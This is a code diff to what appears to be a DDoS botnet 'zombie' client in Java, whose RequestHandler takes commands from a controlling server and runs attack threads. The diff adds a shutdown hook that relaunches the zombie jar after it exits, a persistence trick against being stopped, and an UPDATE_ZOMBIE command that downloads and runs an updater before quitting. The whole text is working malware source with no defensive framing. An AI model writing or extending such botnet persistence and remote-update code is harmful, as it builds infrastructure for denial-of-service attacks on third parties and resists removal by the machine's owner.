@@ -3,15 +3,39 @@ package org.ddos.zombie;
 import java.io.IOException;
 import java.io.Serializable;
 import java.net.SocketAddress;
+import java.net.URISyntaxException;
 import java.util.ArrayList;
 
 import org.ddos.network.ZombieNetwork;
+import org.ddos.updater.Updater;
 import org.jnetwork.DataPackage;
 
 public class RequestHandler {
 	private static ArrayList<Thread> ddosers = new ArrayList<>();
 	private static boolean sendOutput = false;
 	private static SocketAddress address;
+
+	static {
+		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
+			@Override
+			public void run() {
+				try {
+					Thread.sleep(5000);
+				} catch (InterruptedException e) {
+					e.printStackTrace();
+				}
+
+				try {
+					Runtime.getRuntime().exec("java -jar"
+							+ ZombieMain.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+				} catch (IOException e) {
+					e.printStackTrace();
+				} catch (URISyntaxException e) {
+					e.printStackTrace();
+				}
+			}
+		}));
+	}
 
 	public static void handleRequest() throws ClassNotFoundException, IOException {
 		final DataPackage pkgIn = (DataPackage) ZombieNetwork.getClient().getInputStream().readObject();
@@ -65,6 +89,12 @@ public class RequestHandler {
 		} else if (pkgIn.getMessage().equals("STOP_READ_ZOMBIE")) {
 			sendOutput = false;
 			address = null;
+		} else if (pkgIn.getMessage().equals("UPDATE_ZOMBIE")) {
+			Updater.downloadIfNonexistent();
+
+			System.out.println("Updating.");
+			Runtime.getRuntime().exec("java -jar " + System.getProperty("user.dir") + "\\" + Updater.NAME + " Zombie");
+			System.exit(0);
 		}
 
 		handleRequest();
